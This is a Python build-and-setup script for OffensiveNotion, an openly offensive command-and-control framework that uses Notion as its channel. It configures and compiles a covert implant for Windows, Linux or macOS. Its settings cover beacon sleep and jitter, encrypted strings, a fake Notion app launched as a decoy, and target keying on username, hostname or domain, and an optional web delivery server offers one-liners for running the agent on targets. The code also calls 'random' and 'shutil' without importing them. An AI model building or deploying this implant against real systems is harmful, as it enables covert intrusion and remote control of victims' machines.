#!/usr/bin/env python3
import os
import argparse
import subprocess as sub
from shutil import copyfile, move, rmtree
import utils
from utils.colors import *
from utils.inputs import *
from utils.file_utils import *
from utils.c2_linter import *
from utils.web_delivery import *
import getpass
import json
import signal
import sys

parser = argparse.ArgumentParser(description='OffensiveNotion Setup. Must be run as root. Generates the '
                                             'OffensiveNotion agent in a container.')
parser.add_argument('-o', '--os', choices=['linux',
                                           'windows',
                                           'macos'
                                           ],help='Target OS')
parser.add_argument('-b', '--build', choices=['debug', 'release'], help='Binary build')
parser.add_argument('-c', '--c2lint', default=False, action="store_true", help="C2 linter. Checks your C2 config "
                                                                               "by creating a test page on your "
                                                                               "Listener.")
parser.add_argument('-w', '--webdelivery', default=False, action="store_true", help="Start a web delivery server to "
                                                                                    "host and deliver your agent. "
                                                                                    "Provides convenient one liners "
                                                                                    "to run on the target.")
parser.add_argument('-m', '--method', choices=['powershell', 'wget-linux', 'wget-psh', 'python-linux', 'python-windows'], help='Method of web delivery')
parser.add_argument('-ip', '--hostIP', help='Web server host IP.')
parser.add_argument('-p', '--port', help='Web server host port.')

args = parser.parse_args()

# Globals
curr_dir = os.getcwd()
config_file = f"{curr_dir}/config.json"
bin_dir = f"{curr_dir}/bin"
agent_dir = f"{curr_dir}/agent"
dockerfile = f"{curr_dir}/Dockerfile"

def print_logo():
    logo = Fore.CYAN + """
   ____   __  __               _           _   _       _   _             
  / __ \ / _|/ _|             (_)         | \ | |     | | (_)            
 | |  | | |_| |_ ___ _ __  ___ ___   _____|  \| | ___ | |_ _  ___  _ __  
 | |  | |  _|  _/ _ \ '_ \/ __| \ \ / / _ \ . ` |/ _ \| __| |/ _ \| '_ \ 
 | |__| | | | ||  __/ | | \__ \ |\ V /  __/ |\  | (_) | |_| | (_) | | | |
  \____/|_| |_| \___|_| |_|___/_| \_/ \___|_| \_|\___/ \__|_|\___/|_| |_|
    """
    centered = int((len(logo)/6)/2)
    pad = "-"
    catchphrase = ["But, Why?", "Because reasons!", "I find the very notion offensive.", "KEKW", "The absolute madlads", "NEW. TECH."]
    tag = random.choice(catchphrase)
    creators = "mttaggart | HuskyHacks"

    len_tag = len(tag)
    padding = pad * (centered - len_tag // 2 - 1)
    space = " "
    spaces = space * (centered - (len(creators)) // 2)

    print(logo)
    print(padding + tag + padding)
    print(spaces + creators + "\n" + Fore.RESET)

# Is there a config file?
def does_config_exist() -> bool:
    """
    Checks for the config file, returns a bool value.
    """
    print(f"{info}Checking config file...")
    if config_file_exists := os.path.exists(config_file):
        print(f"{good}Config file located!")
        return True
    else:
        print(f"{info}No config file located")
        return False


def take_in_vars():
    """
    Intakes vars for Sleep, Jitter Time, API Key, and Parent Page ID.
    """
    # Sleep
    sleep_interval = ask_for_input(
        f"{important}Enter the number of seconds for the agent's sleep interval [default is 30][format: #]",
        "30",
    )
    print(f"{good}Sleep interval: {sleep_interval}")
    # Jitter Time
    jitter_time = ask_for_input(
        f"{important}Enter the number of seconds for the agent's jitter range [default is 10][format: #]",
        "10",
    )
    print(f"{good}Jitter range: {jitter_time}")
    # Log Level
    log_level = ask_for_input(
        f"{important}Enter the logging level for the agent (0-5) [default is 2][format: #]",
        "2",
    )
    # API Key

    api_key = ""
    while "secret_" not in api_key:
        api_key = getpass.getpass(
            f"{important}Enter your Notion Developer Account API key [will be concealed from terminal]> "
        )
        if "secret_" not in api_key:
            print(f"{important}Hmm, that doesn't look like an API key. Try again!")
        else:
            continue

    print(f"{good}Got your API key!")
    # Parent Page ID
    print(
        "\n" + important + "Your notion page's parent ID is the long number at the end of the page's URL.\n[*] For example, "
                           "if your page "
                           "URL is '[https://]www[.]notion[.]so/LISTENER-11223344556677889900112233445566', then your parent "
                           "page ID is "
                           "11223344556677889900112233445566\n")
    parent_page_id = input(f"{important}Enter your listener's parent page ID > ")
    print(f"{good}Parent page ID: {parent_page_id}")
    # Litcrypt Key
    litcrypt_key = ask_for_input(
        f"{important}Enter the key to use to encrypt your agent's strings [default is 'offensivenotion']",
        "offensivenotion",
    )
    print(f"{good}Encryption key: {litcrypt_key}")

    # Launch App
    launch_app = ask_for_input(
        f"{important}Launch fake Notion app (Windows/Linux only) (y/N)?", "n"
    )
    launch_app = "true" if launch_app == "y" else "false"
    print(f"{good}Launch App: {launch_app}")

    print(f"{important}Guardrails!")
    env_checks = []
    key_username = ask_for_input(
        f"{important}Enter a username to key off. [Leave blank for no keying to username]",
        "",
    )
    if key_username != "":
        env_checks.append({"Username": key_username})

    key_hostname = ask_for_input(
        f"{important}Enter a hostname to key off. [Leave blank for no keying to hostname]",
        "",
    )
    if key_hostname != "":
        env_checks.append({"Hostname": key_hostname})

    key_domain = ask_for_input(
        f"{important}Enter the domain name to key off. [Leave blank for no keying to domain name]",
        "",
    )
    if key_domain != "":
        env_checks.append({"Domain": key_domain})

    json_vars = {
        "SLEEP": sleep_interval,
        "JITTER": jitter_time,
        "API_KEY": api_key,
        "PARENT_PAGE_ID": parent_page_id,
        "LOG_LEVEL": str(log_level),
        "LITCRYPT_KEY": litcrypt_key,
        "LAUNCH_APP": launch_app,
        # "[{\"Username\": \"husky\"}]"
        "ENV_CHECKS": env_checks
    }
    return json.dumps(json_vars)


def read_config():
    with open("config.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
    print(f"{recc}Your configs are: ")
    for k, v in data.items():
        if k == "API_KEY":
            redacted_key = f"{v[:10]}***{v[-5:]}"
            print(f"    [*] {k}: {redacted_key}")
        else:
            print(f"    [*] {k}: {v}")
    return data


def write_config(json_string):
    with open('config.json', 'w') as outfile:
        outfile.write(json_string)


def are_configs_good() -> bool:
    return utils.inputs.yes_or_no(
        f"{important}Do these look good? [yes/no] [default is yes] > ", "yes"
    )


# When the configs look good:

def copy_source_file():
    print(f"{info}Creating agent's config source code...")
    source_dir = f"{agent_dir}/src/"
    src = f"{source_dir}config.rs"
    dst = f"{source_dir}config.rs.bak"
    copyfile(src, dst)


def sed_source_code():
    print(f"{info}Setting variables in agent source...")
    source_file = f"{agent_dir}/src/config.rs"
    f = open("config.json")
    data = json.load(f)


    for k, v in data.items():
        if k == "ENV_CHECKS":
            key_var = json.dumps(v).replace("\"","\\\"")
            utils.file_utils.sed_inplace(source_file, f"<<{k}>>", key_var)
        else:
            utils.file_utils.sed_inplace(source_file, f"<<{k}>>", v)


def set_env_vars():
    print(f"{info}Setting env vars...")
    f = open("config.json")
    data = json.load(f)
    for k, v in data.items():
        os.environ[f"{k}"] = f"{v}"


def recover_config_source():
    print(f"{info}Recovering original source code...")
    old_conf = f"{agent_dir}/src/config.rs.bak"
    curr_conf = f"{agent_dir}/src/config.rs"
    if exists := os.path.isfile(old_conf):
        try:
            os.remove(curr_conf)
            move(old_conf, curr_conf)
        except Exception as e:
            print(printError + str(e))


def c2_lint(json_string):
    print(f"{info}Checking your C2 configs...")
    if c2_check := utils.c2_linter.create_page(
        json_string["API_KEY"], json_string["PARENT_PAGE_ID"]
    ):
        print(
            f"{good}C2 check passed! Check your Notion notebook for a C2_LINT_TEST page."
        )
    else:
        print(f"{printError}C2 check failed. Check your config.json file.")


def run_web_delivery():
    utils.web_delivery.main(args.hostIP, args.port, args.method, args.os, args.build)


def main():
    print_logo()

    # Config file checks
    configs = does_config_exist()
    if not configs:
        print("[*] Lets set up a config file")
        json_vars = take_in_vars()
        write_config(json_vars)

    json_vars = read_config()
    # C2 Lint
    if args.c2lint:
        c2_lint(json_vars)
    looks_good = are_configs_good()

    while not looks_good:
        json_vars = take_in_vars()
        write_config(json_vars)
        json_vars = read_config()
        if args.c2lint:
            c2_lint(json_vars)
        looks_good = are_configs_good()
    print("[+] Config looks good!")

    try:
        try:
            shutil.copyfile("config.json", "/out/config.json")
            set_env_vars()
            # copy_source_file()
            sed_source_code()
        except Exception as e:
            print(printError + str(e))

        os.chdir("agent")
        # Run cargo. The unstable options allows --out-dir, meaning the user
        # Can mount a folder they select as the destination for the compiled result
        # Parameterizing the cargo build command

        if args.os == "macos":
            os_arg = "--target x86_64-apple-darwin"
        elif args.os == "windows":
            os_arg = "--target x86_64-pc-windows-gnu"
        else:
            os_arg = ""
        build_arg = "--release" if args.build == "release" else ""
        # The subprocess needs the env var, so we'll set it, along with the
        # rest of the env here
        new_env = os.environ.copy()

        # Ensure Litcrypt Key is set for the proper name
        new_env["LITCRYPT_ENCRYPT_KEY"] = json_vars["LITCRYPT_KEY"]
        print(f'{info}Litcrypt env var set to: {new_env["LITCRYPT_ENCRYPT_KEY"]}')

        # Set extra env vars for macOS build
        if args.os == "macos":
            print(f"{info}Building for macOS; setting env vars")
            new_env["PATH"] = (
                f"/OffensiveNotion/osxcross/target/bin{os.pathsep}"
                + os.environ["PATH"]
            )
            new_env["CARGO_TARGET_X86_64_APPLE_DARWIN_LINKER"] = "x86_64-apple-darwin14-clang"
            new_env["CARGO_TARGET_X86_64_APPLE_DARWIN_AR"] = "x86_64-apple-darwin14-ar"

        # print(new_env)

        sub.call(
            [f"cargo build -Z unstable-options --out-dir /out {os_arg} {build_arg}"], shell=True,
            env=new_env,
        )

        # This will make an additional target folder, so blow it away
        # in the event it was on the mounted drive
        rmtree("target")

        try:
            recover_config_source()
        except Exception as e:
            print(printError + str(e))

        if args.webdelivery:
            try:
                run_web_delivery()
            except Exception as e:
                print(printError + str(e))
                exit()
        else:
            print(f"{good}Done! Happy hacking!")
    except KeyboardInterrupt:
        print(f'{recc}Cleaning up and exiting...')
        recover_config_source()
        print(f"{recc}Goodbye!{Fore.RESET}")
        sys.exit(0)


if __name__ == "__main__":
    main()
